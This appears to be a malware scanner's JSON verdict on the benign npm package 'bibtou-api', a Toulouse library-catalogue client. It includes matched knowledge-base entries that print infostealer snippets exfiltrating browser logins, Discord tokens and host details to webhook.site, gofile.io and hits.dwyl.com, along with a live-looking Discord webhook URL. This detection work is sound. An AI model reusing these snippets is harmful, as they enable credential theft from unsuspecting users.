@@ -1,0 +1,946 @@
+{
+  "package_name": "bibtou-api",
+  "package_version": "1.5.0",
+  "label": "benign",
+  "detection_time": "2026-05-26T17:59:50.584139",
+  "status": "success",
+  "selected_files_count": 4,
+  "selected_files": [
+    "package/package.json",
+    "package/lib/index.js",
+    "package/.eslintrc.js",
+    "package/lib/utils.js"
+  ],
+  "is_malicious": false,
+  "total_files": 4,
+  "malicious_files": 0,
+  "total_slices": 2,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/bibtou-api/1.5.0/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/bibtou-api/1.5.0/package/lib/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "const log = require('debug')('bibtou:borrow')\nconst axios = require('axios')\nconst cheerio = require('cheerio')\nconst cheerioTableparser = require('cheerio-tableparser')\nconst qs = require('querystring')\n\nconst promiseUtils = require('blend-promise-utils')\nconst dateFns = require('date-fns')\n\nconst _ = require('lodash')\n\nconst utils = require('./utils')\n\nlet bibHost = 'http://catalogues.toulouse.fr'\n\nfunction setBibHost(host) {\n  bibHost = host\n}\n\nasync function getSession() {\n  const url = `${bibHost}/web2/tramp2.exe/log_in?setting_key=BMT1&screen=MyAccount.html`\n  log(`Get homepage ${url}`)\n  const homeResponse = await axios.get(url)\n  const $ = cheerio.load(homeResponse.data)\n  const loginFormUrl = $('form[name=loginWN]').attr('action')\n  return loginFormUrl\n}\n\nasync function getAccountHtmlPage(session, user) {\n  const requestBody = {\n    fail_screen: 'LoginOTFFailed.html',\n    screen: 'MyAccount.html',\n    server: '',\n    item: '',\n    item_source: '',\n    userid: user.id,\n    pin: user.pin,\n  }\n\n  log(`Get account page ${bibHost}${session}`)\n  const config = {\n    method: 'POST',\n    url: `${bibHost}${session}`,\n    data: qs.stringify(requestBody),\n    headers: {\n      'Content-Type': 'application/x-www-form-urlencoded',\n    },\n  }\n\n  return utils.requestHtmlPage(config)\n}\n\nasync function disconnect(session) {\n  const logoutUrl = `${bibHost}/web2/tramp2.exe/log_out/${session}`\n  log(`Disconnect user: ${logoutUrl}`)\n  let lougoutResponse\n  try {\n    lougoutResponse = await axios.get(logoutUrl)\n    return lougoutResponse.data\n  } catch (error) {\n    log('Disconnect error', { error })\n  }\n\n  return ''\n}\n\nasync function connect(user) {\n  const session = await getSession()\n  if (session) {\n    const sessionToken = session.split('/').pop()\n    await getAccountHtmlPage(session, user)\n    return sessionToken\n  }\n\n  return undefined\n}\n\nasync function renewRequest(session, documents) {\n  let hasnow = documents.map(({ form }) => form)\n  if (hasnow.length === 1) {\n    hasnow = hasnow.pop()\n  }\n  const requestBody = {\n    HASNOW: hasnow,\n    buttons: [\n      'Renew=renew_hasnow screen=MyAccount.html',\n      'renew_hasnow hasnow=all screen=MyAccount.html',\n    ],\n    Renew: 'Renouveler les prêts sélectionnés',\n  }\n\n  const config = {\n    method: 'POST',\n    url: `${bibHost}/web2/tramp2.exe/form/${session}`,\n    data: qs.stringify(requestBody),\n    headers: {\n      'Content-Type': 'application/x-www-form-urlencoded',\n    },\n  }\n  log({ config })\n  const responseHtml = await utils.requestHtmlPage(config)\n  log(responseHtml)\n  return responseHtml\n}\n\nasync function renewDocumentsForUser({ user, documents }) {\n  log(`renewDocumentsForUser ${documents.length} docs for ${user.name}`)\n  // # Connect the user\n  const session = await connect(user)\n  log(`user ${user.name} connected`)\n  // # Renew all user documents\n  const accountHtmlPage = await renewRequest(session, documents)\n  // # Disconnect the user\n  await disconnect(session)\n  log(`user ${user.name} disconnected`)\n  // # Update documents list for user\n  return getAccountInfoFromWebPage(accountHtmlPage, user)\n}\n\nasync function renewDocuments(documents) {\n  log(`renewDocuments ${documents.length} docs`)\n  // # Grouper les documents par utilisateurs\n  const documentsByUsers = _.compact(\n    Object.values(_.groupBy(documents, document => document.user.id)).map(docs => {\n      if (!docs || !docs.length || docs.length === 0) {\n        return null\n      }\n\n      // Liste de { user, documents }\n      return {\n        documents: docs,\n        user: docs[0].user,\n      }\n    }),\n  )\n\n  // # Pour chaque utilisateur renouveller les documents\n  return promiseUtils.mapSeries(documentsByUsers, renewDocumentsForUser)\n}\n\nfunction createBookListFromHtmlTable(tableData) {\n  const cleanTable = tableData.slice(1).map(list => list.slice(1))\n\n  return cleanTable.length > 0\n    ? cleanTable[0].map((titre, index) => {\n        const renewalText = cleanTable[6][index].split('\\n')\n        const [nbRenewal, dateRenewal = ''] = renewalText.map(text => text.trim())\n        return {\n          titre,\n          auteur: cleanTable[1][index],\n          type: cleanTable[2][index],\n          emprunte: cleanTable[3][index],\n          rendre: dateFns.parse(cleanTable[4][index].trim(), 'd/M/yyyy,HH:mm', new Date()),\n          retard: cleanTable[5][index],\n          renewal: {\n            count: nbRenewal || 0,\n            date: dateRenewal,\n          },\n        }\n      })\n    : []\n}\n\nfunction createReservedBookListFromHtmlTable(tableData) {\n  const cleanTable = tableData.slice(1).map(list => list.slice(1))\n\n  return cleanTable.length > 0\n    ? cleanTable[0].map((titre, index) => {\n        const dateSince = cleanTable[4][index]\n        const since =\n          dateSince !== '' ? dateFns.parse(dateSince.trim(), 'd/M/yyyy', new Date()) : undefined\n        return {\n          titre,\n          auteur: cleanTable[1][index],\n          where: cleanTable[2][index],\n          since,\n        }\n      })\n    : []\n}\n\nfunction getAccountRealName(html) {\n  const $ = cheerio.load(html, {\n    decodeEntities: false,\n  })\n  const userRealNameHtml = $(\n    'body > div > div > div > table > tbody > tr > td > table:nth-child(1) > tbody > tr > td > h2',\n  )\n  const userRealName = userRealNameHtml\n    .text()\n    .split(',')\n    .map(name => name.trim())\n  const firstName = userRealName[1] || ''\n  const lastName = userRealName[0] || ''\n  return {\n    first: firstName,\n    last: lastName,\n    full: `${firstName} ${lastName}`,\n  }\n}\n\nfunction getUserInfo(userInfoData, index, regex, defaultValue = '') {\n  const match = userInfoData[index].match(regex)\n  return match && match.length > 0 ? match[0] : defaultValue\n}\n\nfunction getAccountUserInfo(html) {\n  const $ = cheerio.load(html, {\n    decodeEntities: false,\n  })\n  const userInfoHtml = $(\n    '#panel1 > div.bibinfo > table:nth-child(2) > tbody > tr > td.searchcontent',\n  )\n  const userInfoData = userInfoHtml\n    .html()\n    .split('<br>')\n    .map(info => info.trim())\n\n  const expirationDateRegex = /\\d+\\/\\d+\\/\\d+/\n  const mailRegex = /[^\\s]+@[^\\s]+/\n  const phoneRegex = /\\d{2} \\d{2} \\d{2} \\d{2} \\d{2}/\n\n  const expirationDate = getUserInfo(userInfoData, 3, expirationDateRegex, '--/--/--')\n  const mail = getUserInfo(userInfoData, 1, mailRegex)\n  const phone = getUserInfo(userInfoData, 1, phoneRegex)\n\n  return {\n    phone,\n    expirationDate,\n    mail,\n  }\n}\n\nfunction getAccountBorrowedBooks(html, user) {\n  const $ = cheerio.load(html)\n  cheerioTableparser($)\n  const documentListSelector = '#panel2 > div > form > table:nth-child(2)'\n  const documents = $(documentListSelector).parsetable(true, true, true)\n  const bookList = createBookListFromHtmlTable(documents)\n\n  const tds = $('#panel2 > div > form > table:nth-child(2) input[name=HASNOW]')\n    .map(function getNodeValue() {\n      return this.attribs.value\n    })\n    .get()\n\n  return bookList.map((book, index) => {\n    const id = tds[index].split(':').shift()\n    const form = tds[index]\n\n    log(`getBook ${id} ${book.titre}`)\n    return {\n      ...book,\n      id,\n      form,\n      user,\n    }\n  })\n}\n\nfunction getAccountReservedBooks(html, user) {\n  const $ = cheerio.load(html)\n  cheerioTableparser($)\n  const documentListSelector = '#panel3 > div > form > table:nth-child(2)'\n  const documents = $(documentListSelector).parsetable(true, true, true)\n  const bookList = createReservedBookListFromHtmlTable(documents)\n\n  const tds = $('#panel3 > div > form > table:nth-child(2) input[name=request]')\n    .map(function getNodeValue() {\n      return this.attribs.value\n    })\n    .get()\n\n  return bookList.map((book, index) => {\n    return {\n      ...book,\n      id: tds[index].split('|').shift(),\n      form: tds[index],\n      user,\n    }\n  })\n}\n\nfunction getAccountInfoFromWebPage(accountHtmlPage, user) {\n  const userInfo = getAccountUserInfo(accountHtmlPage)\n  const detail = getAccountRealName(accountHtmlPage)\n\n  // # On obtient les emprunts\n  const borrowedBooks = getAccountBorrowedBooks(accountHtmlPage, user)\n  // # On obtient les réservations\n  const reservedBooks = getAccountReservedBooks(accountHtmlPage, user)\n\n  return {\n    detail,\n    info: userInfo,\n    borrowedBooks,\n    reservedBooks,\n  }\n}\n\n/**\n * Obtient pour un utilisateur les détails de son compte\n * - Nom, adresse, période de validité de l'abonnement, mail\n * - Emprunts\n * - Réservation\n * @param {Object} user\n */\nasync function getAccountDetails(user) {\n  if (!user || !user.id || !user.pin) {\n    log(`getAccountDetails l'utilisateur ${user} ne définit pas d'id ou de pin`)\n  }\n\n  try {\n    const session = await getSession()\n    if (session) {\n      const sessionToken = session.split('/').pop()\n      const accountHtmlPage = await getAccountHtmlPage(session, user)\n      // # On se déconnecte pour libérer la session côté serveur\n      await disconnect(sessionToken)\n      return getAccountInfoFromWebPage(accountHtmlPage, user)\n    }\n    return {\n      error: true,\n      message: 'Pas de session disponible',\n      code: 404,\n    }\n  } catch (error) {\n    log(error)\n    return {\n      error,\n      message: 'Erreur interne',\n      code: 500,\n    }\n  }\n}\n\nmodule.exports = {\n  getAccountDetails,\n  setBibHost,\n  renewDocuments,\n}\n",
+          "is_malicious": false,
+          "malice_score": 0.47018609642982484,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code accesses a hardcoded URL 'http://catalogues.toulouse.fr' and performs multiple HTTP GET and POST requests using axios to authenticate a user session, submit user credentials (user.id and user.pin), retrieve account HTML pages, and disconnect the session. It parses the returned HTML using cheerio and cheerio-tableparser to extract sensitive user information including real name, email, phone, subscription expiration date, borrowed books, and reserved books. This data is processed and returned, enabling user account data retrieval and renewal operations via network communication with the hardcoded library catalog server.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a library client interacting with a public library catalog server to authenticate users, retrieve their account information, and renew borrowed documents. It uses standard HTTP requests (axios) and HTML parsing (cheerio) to extract user data such as name, email, phone, and borrowed books. While it handles sensitive user credentials (user.id and user.pin), it does so to perform legitimate operations against a known library system (catalogues.toulouse.fr). There is no evidence of data exfiltration to attacker-controlled endpoints, no access to local system files or environment variables, no obfuscation, and no suspicious network destinations. The known malicious patterns involve direct credential or system data theft and exfiltration to attacker-controlled domains, which is absent here. The code's behavior aligns with a legitimate client library for a library system, not malware.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_113641_174600_snippet_2",
+              "source_package": "MUT-8694 (multiple typosquatted packages) (npm, PyPI)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113641_174600/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.47552186250686646,
+              "code_similarity": 0.4129110872745514,
+              "behavior_similarity": 0.5381326675415039,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// JavaScript (Blank Grabber/Skuld Stealer core logic)\nconst fs = require('fs');\nconst https = require('https');\nconst token = process.env.DISCORD_TOKEN;\nfs.readFile(process.env.APPDATA + '/User Data/Default/Login Data', (err, data) => {\n  if (!err) {\n    const options = {\n      hostname: 'webhook.site',\n      path: '/unique-id',\n      method: 'POST',\n      headers: {'Content-Type': 'application/octet-stream'}\n    };\n    const req = https.request(options);\n    req.write(data);\n    req.end();\n  }\n});",
+                "code_behavior": "At runtime, the code reads sensitive files such as browser login data and environment variables like DISCORD_TOKEN, then exfiltrates this data via HTTPS POST to a remote webhook endpoint controlled by the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses credential stores and environment variables containing sensitive information, then transmits this data to an external server, which is a hallmark of infostealer malware.",
+                  "violated_expectations": "Legitimate packages should not access or transmit user credentials or sensitive files without explicit user consent and clear justification.",
+                  "similar_legitimate_use": "Security auditing tools may access such files, but only with user awareness, explicit permission, and for legitimate security purposes.",
+                  "key_indicators": [
+                    "Access to credential stores (browser login data, environment tokens)",
+                    "Exfiltration of data to webhook.site or similar endpoints",
+                    "Use of environment variables for sensitive data extraction",
+                    "Network transmission of credential data without user consent"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "payload.exe (delivered by the package)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "MUT-8694 (multiple typosquatted packages)",
+                  "package_manager": "npm, PyPI",
+                  "package_versions": "all published versions of the malicious typosquatted packages",
+                  "why_malicious": "The packages are part of a coordinated supply chain attack campaign leveraging typosquatting to impersonate legitimate libraries. Upon installation or import, they download and execute infostealer malware (such as Blank Grabber and Skuld Stealer) designed to exfiltrate sensitive data, including credentials and tokens, from infected systems. The packages attempt to appear trustworthy by referencing legitimate tools and use external platforms (GitHub, repl.it) to host and deliver malicious payloads, primarily targeting Windows users."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious typosquatted package, triggering the download and execution of a remote payload.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Initial payload download and execution on the victim's system"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The malicious payload (infostealer) is executed, establishing persistence and preparing to steal sensitive data.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Credential and data theft capabilities are enabled"
+                  },
+                  {
+                    "step": 3,
+                    "action": "The infostealer accesses sensitive files and environment variables, exfiltrating the stolen data to attacker-controlled endpoints.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives stolen credentials and sensitive information from the victim's system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Package downloads and executes remote code at import-time or during installation",
+                    "Access to credential stores (browser login data, environment tokens) by package or payload code",
+                    "Exfiltration of sensitive data to external endpoints such as webhook.site, GitHub, or repl.it"
+                  ],
+                  "file_indicators": [
+                    "setup.py or __init__.py containing remote code download and execution logic",
+                    "Unexpected executable files (e.g., payload.exe, malware.py) created during package installation or import",
+                    "References to external code hosting platforms (GitHub, repl.it) in package source code"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS requests to raw.githubusercontent.com for payload downloads",
+                    "Connections to webhook.site or similar data collection endpoints for exfiltration",
+                    "Downloads from repl.it or other code hosting services during installation or import"
+                  ],
+                  "how_to_detect": "Monitor for packages that initiate network connections to code hosting or data exfiltration endpoints during installation or import. Flag any package that downloads and executes remote code, accesses credential stores, or references known infostealer infrastructure. Use static analysis to detect suspicious import-time or setup.py logic, and dynamic analysis to observe unexpected network or filesystem activity during package installation or import. Correlate creation of unexpected executables and outbound connections to known malicious infrastructure."
+                }
+              }
+            },
+            {
+              "match_id": "20240708_171641_007733_snippet_1",
+              "source_package": "TeamViewer.exe / BetterShaders Setup 1.0.3.exe / Software.exe (malicious Electron apps) (NSIS installer (Electron app distribution))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240708_171641_007733/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4741601347923279,
+              "code_similarity": 0.3881717920303345,
+              "behavior_similarity": 0.5601484775543213,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode representation based on report\nconst os = require('os');\nconst fs = require('fs');\nconst fetch = require('node-fetch');\n\n// Collect system info\nconst sysInfo = os.userInfo();\nconst browserHistory = fs.readFileSync('path/to/browser/history');\nconst credentials = fs.readFileSync('path/to/credentials');\n\n// Exfiltrate to gofile\nfetch('https://gofile.io/upload', {\n  method: 'POST',\n  body: { sysInfo, browserHistory, credentials }\n});",
+                "code_behavior": "At runtime (upon application execution), the code collects system information, browser history, and credentials from the filesystem using Node.js APIs, then sends this data via an outbound HTTP POST request to the gofile.io file-sharing service, resulting in exfiltration of sensitive user data to an external attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "The code programmatically accesses sensitive files such as browser history and credential stores, then transmits this data to an external file-sharing service (gofile.io) without user knowledge or consent. This behavior is characteristic of infostealer malware.",
+                  "violated_expectations": "Legitimate Electron applications should not access or transmit user credentials, browser history, or detailed system information without explicit user consent and clear disclosure. Accessing and exfiltrating such data is a direct violation of user privacy and security expectations.",
+                  "similar_legitimate_use": "Some legitimate applications may collect anonymized telemetry or crash logs, but they do not access credential stores or browser histories, and always request user consent for any data collection or transmission.",
+                  "key_indicators": [
+                    "Direct file access to browser history and credential files from within Electron app resources",
+                    "Outbound HTTP POST requests to gofile.io/upload or similar file-sharing endpoints",
+                    "Node.js code embedded in .asar archives performing OS-level data harvesting",
+                    "Absence of user prompts or consent dialogs for sensitive data access or transmission"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "at runtime (upon application execution)",
+                  "file_location": "app\\resources\\app.asar\\a.js",
+                  "required_permissions": [
+                    "filesystem (read access to browser and credential files)",
+                    "network (outbound HTTP POST requests)",
+                    "environment_vars (access to user/system information)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "TeamViewer.exe / BetterShaders Setup 1.0.3.exe / Software.exe (malicious Electron apps)",
+                  "package_manager": "NSIS installer (Electron app distribution)",
+                  "package_versions": "Unknown (all observed hashes: 9926e2782d603061b52d88f83d93e7af, cfc6e0014b3cc8d4dcaf0d76e2382556, b150afa6b3642ea1da1233b76f7b454e)",
+                  "why_malicious": "These packages are Electron-based desktop applications distributed via NSIS installers that contain malicious Node.js code within their .asar archives. The code is designed to harvest sensitive user data, including system information, browser histories, and credentials, and exfiltrate it to external file-sharing services such as gofile.io. The applications masquerade as legitimate software to evade detection and facilitate data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User downloads and executes a trojanized Electron app distributed as an NSIS installer.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious Electron app is installed and launched."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Electron app unpacks and executes Node.js code from the .asar archive (a.js) upon application startup.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is loaded into memory and prepared for execution."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious Node.js code collects system information, browser history, and credentials from the victim's machine.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive data is gathered from the victim's machine."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collected data is exfiltrated to gofile.io via HTTP POST request.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives stolen data via the file-sharing service."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Electron app accessing browser history and credential files without user consent",
+                    "Electron app making outbound HTTP POST requests to file-sharing services such as gofile.io",
+                    "Node.js code within .asar archives performing OS-level data collection and exfiltration"
+                  ],
+                  "file_indicators": [
+                    "Presence of suspicious .asar files in Electron app resources (e.g., app\\resources\\app.asar\\a.js)",
+                    "NSIS installer files with hashes: 9926e2782d603061b52d88f83d93e7af, cfc6e0014b3cc8d4dcaf0d76e2382556, b150afa6b3642ea1da1233b76f7b454e"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to https://gofile.io/upload from Electron app processes",
+                    "Unusual HTTP POST requests containing system or credential data to file-sharing domains"
+                  ],
+                  "how_to_detect": "Monitor Electron-based applications for unauthorized access to sensitive files such as browser history and credential stores. Inspect .asar archives for embedded Node.js scripts that perform data harvesting or exfiltration. Flag NSIS installers with known malicious hashes or those that unpack Electron apps exhibiting these behaviors. Monitor network traffic for outbound HTTP POST requests to gofile.io/upload or similar file-sharing services originating from Electron app processes."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205438_695471_snippet_2",
+              "source_package": "angulerjs (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205438_695471/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4653055965900421,
+              "code_similarity": 0.39964383840560913,
+              "behavior_similarity": 0.5309673547744751,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// index.js (formatted)\nconst os = require('os');\nconst https = require('https');\nconst { execSync } = require('child_process');\nconst username = os.userInfo().username;\nconst hostname = os.hostname();\nlet ip = '';\ntry {\n  ip = execSync('curl -s ifconfig.me').toString().trim();\n} catch (e) {}\nconst data = JSON.stringify({ username, hostname, ip });\nconst options = {\n  hostname: 'hits.dwyl.com',\n  path: '/api/collect',\n  method: 'POST',\n  headers: { 'Content-Type': 'application/json' }\n};\nconst req = https.request(options);\nreq.write(data);\nreq.end();",
+                "code_behavior": "Upon manual execution, the code collects the current user's username, hostname, and public IP address using os and child_process modules, then sends this data via HTTPS POST to hits.dwyl.com, providing an alternate exfiltration channel for host information to an attacker-controlled domain.",
+                "malice_analysis": {
+                  "why_suspicious": "The code is functionally identical to the malicious preinstall script but targets a different exfiltration endpoint. Its presence in index.js, the main entry point of the package, suggests intent to provide a backup or alternate channel for data exfiltration, even if the preinstall script is blocked or removed.",
+                  "violated_expectations": "Legitimate index.js files in npm packages are expected to provide the main library functionality, not to collect and transmit sensitive host information or make unsolicited network requests.",
+                  "similar_legitimate_use": "There are no legitimate use cases for index.js to silently collect and exfiltrate host information. Standard practice is to only collect anonymized telemetry with user consent and clear documentation.",
+                  "key_indicators": [
+                    "Collection of sensitive host information (username, hostname, public IP) in index.js",
+                    "Outbound HTTPS POST request to hits.dwyl.com, a non-standard and attacker-controlled endpoint",
+                    "Redundant exfiltration logic mirroring the preinstall script",
+                    "No user notification, consent, or documentation of data collection",
+                    "Use of os, https, and child_process modules for data collection and transmission"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "manual execution (not automatically triggered)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "angulerjs",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.3 (and all versions prior to 8.7.6)",
+                  "why_malicious": "The package is malicious because it surreptitiously collects sensitive host information (username, hostname, and public IP address) during installation and exfiltrates it to attacker-controlled endpoints without user knowledge or consent. It was distributed as part of a large-scale typosquatting campaign, mimicking popular libraries to deceive users and facilitate unauthorized data collection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious npm package (e.g., angulerjs@1.1.3).",
+                    "implemented_by": [],
+                    "leads_to": "Triggers preinstall script execution."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The preinstall script (new.js) is executed, collecting username, hostname, and public IP address from the host system.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Collected data is sent via HTTPS POST to a Discord webhook controlled by the attacker.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive host information."
+                  },
+                  {
+                    "step": 4,
+                    "action": "If index.js is executed (manually or by other means), it collects the same information and sends it to hits.dwyl.com.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Provides an alternate exfiltration channel for the attacker."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm preinstall scripts that collect and exfiltrate system information (username, hostname, public IP) during installation",
+                    "Outbound network requests to Discord webhooks or suspicious domains (e.g., hits.dwyl.com) from installation scripts",
+                    "Presence of redundant exfiltration logic in both preinstall scripts and main entry points (e.g., new.js and index.js)"
+                  ],
+                  "file_indicators": [
+                    "package.json with preinstall field referencing suspicious scripts such as new.js",
+                    "new.js or index.js files containing combined use of os, https, and child_process modules for data collection and transmission",
+                    "Hardcoded references to external domains such as discord.com/api/webhooks or hits.dwyl.com in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to discord.com/api/webhooks/1155988140591419412/bleuGvUtBCzaGsAkAI1MT9Yd-6YxHuUlZe91XSdfioky5-0e3gzeW4ztWskX1qYjSxzr",
+                    "Outbound HTTPS POST requests to hits.dwyl.com/api/collect"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for preinstall scripts that access system information (username, hostname, public IP) and initiate outbound network requests to external domains, especially Discord webhooks or non-standard endpoints like hits.dwyl.com. Flag packages with suspiciously named scripts (e.g., new.js) referenced in package.json preinstall fields. Use static analysis to detect the use of os, https, and child_process modules in installation or entry-point scripts, and employ network monitoring to identify exfiltration attempts to known malicious endpoints. Pay special attention to packages with names mimicking popular libraries, as these are common in typosquatting campaigns."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205347_836347_snippet_6",
+              "source_package": "N/A (example code, not a real package) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205347_836347/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4610772728919983,
+              "code_similarity": 0.4348610043525696,
+              "behavior_similarity": 0.487293541431427,
+              "matched_snippet": {
+                "snippet_id": "snippet_6",
+                "code_snippet": "app.get('/account', (req, res) => {\n  const obfuscatedId = req.query.id; // Get the obfuscated user ID from the request parameter\n  if (obfuscatedId) {\n    const user = users.find((u) => obfuscateUserId(u.id) === obfuscatedId);\n    if (user) {\n      res.send(`Account information for ${user.email}: ${user.accountData}`);\n    } else {\n      res.send('User not found');\n    }\n  } else {\n    res.send('User ID not provided');\n  }\n});\n\n// Obfuscation function\nconst obfuscateUserId = (userId) => {\n  // custom obfuscation logic here\n  return obfuscatedId;\n}",
+                "code_behavior": "At runtime, when an HTTP GET request is made to /account with an obfuscated id query parameter, the code attempts to match the obfuscated ID to a user and returns the user's account data without verifying ownership or authorization, allowing attackers to access any user's data if the obfuscated ID is known or guessed.",
+                "malice_analysis": {
+                  "why_suspicious": "Obfuscation does not provide real security; attackers can reverse or brute-force obfuscated IDs to access unauthorized data, bypassing proper access controls.",
+                  "violated_expectations": "Normal behavior would enforce access control based on authenticated user identity, not rely on obscured identifiers for sensitive data access.",
+                  "similar_legitimate_use": "Obfuscation may be used for non-sensitive data, but never as a substitute for robust access control on private information.",
+                  "key_indicators": [
+                    "Reliance on obfuscation for access control to sensitive data",
+                    "No ownership or authorization check on account data retrieval",
+                    "Sensitive information accessible via obfuscated, user-controlled parameter"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (HTTP GET request to /account?id=8a76dh3t)",
+                  "file_location": "app.js (Express route handler)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "N/A (example code, not a real package)",
+                  "package_manager": "npm",
+                  "package_versions": "N/A (applies to all versions if implemented as shown)",
+                  "why_malicious": "The code examples demonstrate broken access control vulnerabilities in Express.js applications, which allow unauthorized users to access sensitive data or privileged functionality. While not a malicious package per se, these code patterns enable attackers to escalate privileges, access other users' data, or leak sensitive information, which can be exploited for malicious purposes."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker discovers unprotected or weakly protected admin or account routes (e.g., /admin, /admin?isAdmin=true, /897928394834023-12, /account?userId=1, /account?id=8a76dh3t) through enumeration or code analysis.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_5",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Unauthorized access to admin functionality or other users' sensitive data."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker exploits lack of authentication/authorization or manipulates query parameters (such as isAdmin, userId, or obfuscatedId) to gain elevated privileges or access data belonging to other users.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_5",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Privilege escalation, data leakage, or further exploitation of the application."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Sensitive information (such as admin credentials) may be exposed in logs if attacker or insider has log access, due to insecure logging practices.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Credential theft, lateral movement, or persistent access by attackers or malicious insiders."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Sensitive routes (e.g., /admin, /account, /897928394834023-12) accessible without authentication or authorization checks",
+                    "Access control decisions based on user-supplied query parameters (e.g., isAdmin, userId, obfuscatedId)",
+                    "Logging of sensitive information such as passwords, tokens, or account data in plaintext",
+                    "Obscure or non-standard routes exposing privileged functionality without access controls"
+                  ],
+                  "file_indicators": [
+                    "app.js or similar files with Express route handlers lacking authentication or authorization middleware",
+                    "Routes with hardcoded or obfuscated paths (e.g., /897928394834023-12) serving sensitive content",
+                    "Console.log or logging statements including sensitive data such as passwords or account information"
+                  ],
+                  "network_indicators": [
+                    "Unusual access patterns to admin or account endpoints from unauthenticated sessions",
+                    "Multiple requests to /account with varying userId or obfuscatedId parameters, indicating enumeration attempts",
+                    "Requests to admin endpoints with suspicious query parameters (e.g., isAdmin=true) from unprivileged users"
+                  ],
+                  "how_to_detect": "Scan Express route handlers for missing authentication and authorization checks, especially on sensitive endpoints like /admin, /account, or non-standard routes. Flag any access control logic that relies on user-supplied query parameters or obfuscated IDs. Monitor logs for statements that include sensitive data such as passwords or account information. Use static analysis tools to identify routes that lack proper middleware for access control, and monitor network traffic for unauthorized access attempts or enumeration patterns targeting privileged endpoints."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104013_195108_snippet_3",
